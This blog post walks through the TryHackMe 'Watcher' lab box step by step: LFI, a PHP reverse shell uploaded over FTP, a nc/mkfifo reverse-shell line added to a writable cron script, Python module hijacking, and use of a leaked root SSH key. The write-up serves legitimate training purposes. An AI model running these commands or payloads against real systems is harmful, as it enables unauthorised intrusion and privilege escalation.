---
layout: post
title: TryHackMe Walkthrough - Watcher
date: 2021-03-14
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Medium
permalink: /2021/03/TryHackMe-Walkthrough-Watcher/
img: 2021/03/Watcher.png
---

This is my walkthrough of the [Watcher room on TryHackMe](https://tryhackme.com/room/watcher). There are seven flags to find, without any additional description.

* Room: Watcher
* Difficulty: Medium
* URL: https://tryhackme.com/room/watcher

## Scanning

The first thing to do when attacking a box is to scan it. I usually do this in three steps: 
1. An aggressive scan on the first 10 000 ports (`nmap -A -oN nmap.txt target`)
1. A vulnerability  scan on the first 10 000 ports (`nmap -script vuln -oN nmapVuln.txt target`)
1. A SYN scan on all the ports (`sudo nmap -sS -p- -oN nmapFull.txt target`)

Here are the results of the first scan:
```bash
# Nmap 7.91 scan initiated Sun Mar 14 09:11:24 2021 as: nmap -A -oN nmap.txt target
Nmap scan report for target (10.10.208.34)
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 14 09:11:51 2021 -- 1 IP address (1 host up) scanned in 27.64 seconds
```

The vulnerabilities and full scan did not bring anything more of interest.

The first opened port is for FTP. Anonymous login does not seems to be allowed, but lets try it anyway.

```bash
ftp target
Connected to target.
220 (vsFTPd 3.0.3)
Name (target:ehogue): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

No luck here, so lets look at the web site on port 80.

## Web Site

Navigating to http://target/ gives us a site about cork placemats. A quick look at the request in Burp does not show anything interesting. 

However, there is a robots.txt file that contains two entries.
```
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

Navigating to http://target/flag_1.txt give us our first flag. http://target/secret_file_do_not_read.txt is forbidden. 

Now I start scanning site for hidden pages. I use GoBuster to scan web sites. I usually use two different lists to do so. I should probably build one list with only the unique values out of those two.

```bash
gobuster dir -e -u http://target/ -t30 -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/03/14 13:09:21 Starting gobuster in directory enumeration mode
===============================================================
http://target/.hta                 (Status: 403) [Size: 271]
http://target/.htaccess            (Status: 403) [Size: 271]
http://target/.htpasswd            (Status: 403) [Size: 271]
http://target/css                  (Status: 301) [Size: 298] [--> http://target/css/]
http://target/images               (Status: 301) [Size: 301] [--> http://target/images/]
http://target/index.php            (Status: 200) [Size: 4826]                  
http://target/robots.txt           (Status: 200) [Size: 69]                    
http://target/server-status        (Status: 403) [Size: 271]        
===============================================================
2021/03/14 13:10:00 Finished
===============================================================
```
Nothing very interesting here. 

While GoBuster was running, I started looking around the site. When I clicked on one of the post, it pointed to this url: http://target/post.php?post=striped.php . This looked like it could be used for a [Local File Inclusion (LFI)](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) attack. 

So I used it to try reading the secret file that I could not access earlier. I loaded http://target/post.php?post=secret_file_do_not_read.txt and it worked. The file contains the following message: 
```
Hi Mat,
The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.
Will

 ----------
ftpuser:PASSWORD
```
We now have the credentials to the FTP server. It also hints that we will be able to write files in the FTP server, and where they will be saved. 

First, lets make sure that the code is executed when included. I tried to include index.php to see if it would output the content, or execute it. 

Load http://target/post.php?post=index.php, you will see the the index page loaded inside the post page. 

![LFI](/assets/images/2021/03/LFI.png "LFI")

Then, I tried to get the post.php source code to see if there where any filtering, or if I could use it to load any file. 

Loading  http://target/post.php?post=php://filter/convert.base64-encode/resource=post.php gave me the PHP source code encoded in base64. I decoded it, and saw the there is no filtering. You can load any file from the server. 

```php
<div class="col-8">
  <?php include $_GET["post"]; ?>
</div>
```

## Getting a Shell
Now I knew I could use the FTP server to upload a file, then execute it on the server through the LFI vulnerability. 

```bash
ftp target
Connected to target.
220 (vsFTPd 3.0.3)
Name (target:ehogue): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03 01:58 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 files
-rw-r--r--    1 0        0              21 Dec 03 01:58 flag_2.txt
226 Directory send OK.
ftp> get flag_2.txt
local: flag_2.txt remote: flag_2.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
226 Transfer complete.
21 bytes received in 0.00 secs (84.0484 kB/s)
```

We found the second flag in the FTP server. We also see that the files folder is writable, so we can push our reverse shell there. 

I use the PHP reverse shell that is available in Kali at `/usr/share/webshells/php/php-reverse-shell.php`. 

```ftp
ftp> cd files 
250 Directory successfully changed.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5492 bytes sent in 0.00 secs (5.8002 MB/s)
```

According to the message found earlier, that file should now be at `/home/ftpuser/ftp/filesphp-reverse-shell.php`. 

I started a Netcat listener in my Kali VM (`nc -lvnp 4444`). Then loaded http://target/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php in a browser. I got a connection on my listener. 

I stabilized my shell with the following commands:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Hit Ctrl-z to go background the shell
stty raw -echo;fg
```

From there, I found a third flag in the web site files. 

```bash
www-data@watcher:/$ whoami
www-data
www-data@watcher:/$ ls /var/www/html/
bunch.php   images               post.php    secret_file_do_not_read.txt
css         index.php            robots.txt  striped.php
flag_1.txt  more_secrets_a9f10a  round.php
www-data@watcher:/$ ls /var/www/html/more_secrets_a9f10a/           
flag_3.txt
www-data@watcher:/$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt 
FLAG{SOME FLAG}
```

## Escalate to Toby
Now that we have a shell, we need to try to escalate our privileges. 

First thing to do is check is the current user can run sudo. www-data should not, but it's a good idea to check anyway. 

```bash
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

www-data is allowed to run any command as toby. 

```bash
sudo -utoby bash -p
toby@watcher:/$ whoami
toby
toby@watcher:/$ ls -l /home/toby/
total 12
-rw------- 1 toby toby   21 Dec  3 01:58 flag_4.txt
drwxrwxr-x 2 toby toby 4096 Dec  3 03:31 jobs
-rw-r--r-- 1 mat  mat    89 Dec 12 15:25 note.txt
```

We have our 4th flag.

## Escalate to Mat

We have to find a way to elevate our privileges again. `sudo -l` require a password, so we need to find something else. 

There is a note.txt file in the home folder, lets look at it. 
```
cat note.txt 
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

It looks like there is a cron job running, probably as Mat that we might be able to use. There is a jobs folder, and it contains a sh file. 

```bash
ls -l jobs/
total 4
-rwxr-xr-x 1 toby toby 46 Dec  3 03:31 cow.sh
toby@watcher:~$ cat jobs/cow.sh 
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```
This might be the cron from the message. And we can write to it. So I modified to add a reverse shell connection, started another Netcat listener and waited for a connection. 

Add this to jobs/cow.sh
```bash
mkfifo /tmp/kirxhbg; nc 10.13.3.36 4445 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg
```

The next time the cron runs, you will get a new connection. 

```bash
nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.157.89 55670
whoami
mat
ls /home/mat
cow.jpg
flag_5.txt
note.txt
scripts
```

That flag #5. 

## Escalate to Will

That shell was pretty unstable so I copied my ssh public key to the server and reconnected through ssh. 

```bash
mkdir .ssh
echo "My Public Key" > .ssh/authorized_keys
chmod 700 .ssh
chmod 600 .ssh/authorized_keys
```

Once connected, there is another note.txt file in the home folder. 

```
cat note.txt 
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

Sure enough, we can run a python script as will without a password.

```bash
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

We are not allowed to modify the script, but lets see what it does. 

```bash
mat@watcher:~$ ls -l scripts/will_script.py
-rw-r--r-- 1 will will 208 Dec  3 01:58 scripts/will_script.py

mat@watcher:~$ cat scripts/will_script.py 
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)

```

The script reads a command from the command line, then sends it to `get_command` and execute it if it's one of the three allowed commands. 

The interesting part is `get_command`, it's imported from cmd.py which is in the same folder as the script. 

```bash
mat@watcher:~$ ls -la scripts/cmd.py 
-rw-r--r-- 1 mat mat 133 Dec  3 03:31 scripts/cmd.py
mat@watcher:~$ cat scripts/cmd.py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

We can write to this file. So we can modify it to start a new bash shell as Will. We need to add an import of os. Then add the following at the beginning of the `get_command` function.

```python
os.system('/bin/bash -p')
```

After that, we can run the python script as will and get a shell. 

```bash
mat@watcher:~$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
will@watcher:~$ whoami
will
will@watcher:~$ ls -l /home/will/
total 4
-rw------- 1 will will 41 Dec  3 01:58 flag_6.txt
```

We have flag 6. 

## Escalate to root
For this step, there are no note.txt file to give us a hint. Running `sudo -l` requires a password, so no luck there either.

I checked for the groups of the user, and they are part of the adm group. That looked interesting. 

I searched for files that belongs to that group. And found a backups folder with one file in it: key.b64. 

I decoded the file, and it contained a ssh private key. 

```bash
cat /opt/backups/key.b64 | base64 -d
-----BEGIN RSA PRIVATE KEY-----
...
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----

```

I took that key, copied it in a file on my machine and change its permissions to 600. Then used it to connect back to the server as root. 

```bash
ssh root@target -i root_id_rsa 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

root@watcher:~# ls -l 
total 4
-rw-r--r-- 1 root root 31 Dec  3 02:26 flag_7.txt

```

That was our last flag. 

This is a fun box to root. With many steps. I'm not sure it should be classified as medium difficulty. All the steps where pretty easy to do. Especially with the note.txt files giving huge hints. 

Text also published on : https://blog.hackfest.ca/blog/TryHackMe-Walkthrough-Watcher
